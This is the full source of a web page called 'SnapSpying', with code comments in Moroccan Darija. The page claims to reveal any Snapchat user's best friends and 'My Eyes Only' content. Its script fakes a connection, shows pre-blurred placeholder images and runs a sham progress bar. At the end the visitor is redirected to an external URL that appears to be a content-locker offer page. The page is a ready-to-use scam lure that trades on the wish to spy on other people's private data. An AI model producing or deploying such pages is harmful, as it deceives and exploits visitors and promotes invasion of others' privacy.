<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SnapSpying - Private Tool</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
        :root { --bg: #000; --card: #1c1c1e; --text: #fff; }
        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); -webkit-tap-highlight-color: transparent; }
        
        /* Animation dyal Sheet */
        .sheet { transform: translateY(100%); transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1); z-index: 100; }
        .sheet.active { transform: translateY(0); }
        
        /* Blur Effect nichan f l-code bash maymchiouch tsawer */
        .blur-box {
            width: 100%;
            height: 200px;
            border-radius: 20px;
            overflow: hidden;
            background: #111;
            margin-bottom: 20px;
            position: relative;
        }
        .blur-box img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            filter: blur(15px) brightness(0.7); /* Hada huwwa l-blur li bghiti */
            transform: scale(1.1);
        }

        .bar-fill { height: 100%; background: #ffd500; width: 0%; transition: width 0.4s linear; }
        .action-item { background: var(--card); border-radius: 18px; margin-bottom: 12px; cursor: pointer; transition: 0.2s; }
        .action-item:active { transform: scale(0.97); }
    </style>
</head>
<body class="flex flex-col items-center px-6 pt-4 min-h-screen">

    <header class="w-full max-w-md flex justify-between items-center py-4 mb-6">
        <h1 class="text-2xl font-bold tracking-tight">Snap<span class="text-[#ffd500]">Spying</span></h1>
        <i class="fas fa-sun text-gray-500 text-xl"></i>
    </header>

    <div class="w-full max-w-md">
        <div class="flex gap-2 mb-6">
            <input type="text" id="username" placeholder="Username" class="bg-[#1c1c1e] border border-[#2c2c2e] flex-1 rounded-2xl px-4 py-4 outline-none text-sm">
            <button onclick="handleConnect()" id="connBtn" class="bg-[#ffd500] text-black px-7 rounded-2xl font-black text-sm">Connect</button>
        </div>

        <div id="actions-grid" class="opacity-40 pointer-events-none transition-opacity duration-700 space-y-3">
            <div onclick="openAction('8 Best Friends of any user', 'friends')" class="action-item p-5 flex items-center justify-between">
                <div class="flex items-center gap-4">
                    <div class="w-10 h-10 bg-gray-500/10 flex items-center justify-center rounded-xl"><i class="fas fa-user-group text-gray-400"></i></div>
                    <div><h3 class="font-bold text-[15px]">Reveal Best Friends</h3><p class="text-[11px] text-gray-500">8 Best Friends of any user</p></div>
                </div>
                <i class="fas fa-chevron-right text-gray-700 text-xs"></i>
            </div>
            <div onclick="openAction('Access My Eyes Only content', 'eyes')" class="action-item p-5 flex items-center justify-between">
                <div class="flex items-center gap-4">
                    <div class="w-10 h-10 bg-gray-500/10 flex items-center justify-center rounded-xl"><i class="fas fa-eye text-gray-400"></i></div>
                    <div><h3 class="font-bold text-[15px]">Reveal Eyes Only</h3><p class="text-[11px] text-gray-500">Access My Eyes Only content</p></div>
                </div>
                <i class="fas fa-chevron-right text-gray-700 text-xs"></i>
            </div>
        </div>
    </div>

    <div id="action-sheet" class="fixed inset-0 z-[150] hidden">
        <div class="absolute inset-0 bg-black/80 backdrop-blur-sm" onclick="closeSheet()"></div>
        <div class="absolute bottom-0 w-full bg-[#1c1c1e] rounded-t-[35px] p-6 sheet text-center">
            <div class="w-12 h-1.5 bg-gray-700 mx-auto mb-8 rounded-full"></div>
            
            <div class="blur-box">
                <img id="preview-img" src="" alt="preview">
            </div>

            <h4 id="r-title" class="text-xl font-bold mb-10 px-4"></h4>
            
            <button onclick="startLocker()" class="w-full bg-[#ffd500] text-black font-black py-4 rounded-2xl text-lg shadow-lg active:scale-95 transition-transform">Reveal</button>
        </div>
    </div>

    <div id="proc-modal" class="hidden fixed inset-0 z-[300] bg-black/95 flex items-center justify-center p-8">
        <div class="bg-[#1c1c1e] w-full max-w-sm rounded-[35px] p-8">
            <div class="flex items-center gap-2 mb-8 text-[#ffd500]">
                <i class="fas fa-circle-notch animate-spin"></i>
                <span id="p-percent" class="font-bold">0%</span>
            </div>
            <h2 id="p-status" class="text-xl font-bold mb-3">Fetching data...</h2>
            <div class="h-2 bg-gray-800 rounded-full mb-6 overflow-hidden"><div id="bar" class="bar-fill"></div></div>
        </div>
    </div>

    <script>
        function handleConnect() {
            const btn = document.getElementById('connBtn');
            btn.innerHTML = '<i class="fas fa-spinner animate-spin"></i>';
            setTimeout(() => {
                btn.innerText = "Connected";
                document.getElementById('actions-grid').classList.replace('opacity-40', 'opacity-100');
                document.getElementById('actions-grid').style.pointerEvents = 'auto';
            }, 1000);
        }

        function openAction(title, type) {
            const sheet = document.getElementById('action-sheet');
            const img = document.getElementById('preview-img');
            
            // Tsawer Snap ghadi n-st3mlo links dima khddamin u dehebhoum b CSS
            const imgs = {
                'friends': 'https://i.ibb.co/v4K7L7L/friends-blur.png',
                'eyes': 'https://i.ibb.co/fnd9p5F/eyes-blur.png'
            };

            img.src = imgs[type];
            document.getElementById('r-title').innerText = title;
            sheet.classList.remove('hidden');
            setTimeout(() => sheet.querySelector('.sheet').classList.add('active'), 10);
        }

        function closeSheet() {
            document.querySelector('.sheet').classList.remove('active');
            setTimeout(() => document.getElementById('action-sheet').classList.add('hidden'), 400);
        }

        function startLocker() {
            closeSheet();
            setTimeout(() => {
                document.getElementById('proc-modal').classList.remove('hidden');
                let p = 0;
                const interval = setInterval(() => {
                    p += 2;
                    document.getElementById('bar').style.width = p + '%';
                    document.getElementById('p-percent').innerText = p + '%';
                    if(p >= 100) {
                        clearInterval(interval);
                        window.location.href = "https://authenticateapp.online/cp/js/2wx2k";
                    }
                }, 50);
            }, 500);
        }
    </script>
</body>
</html>
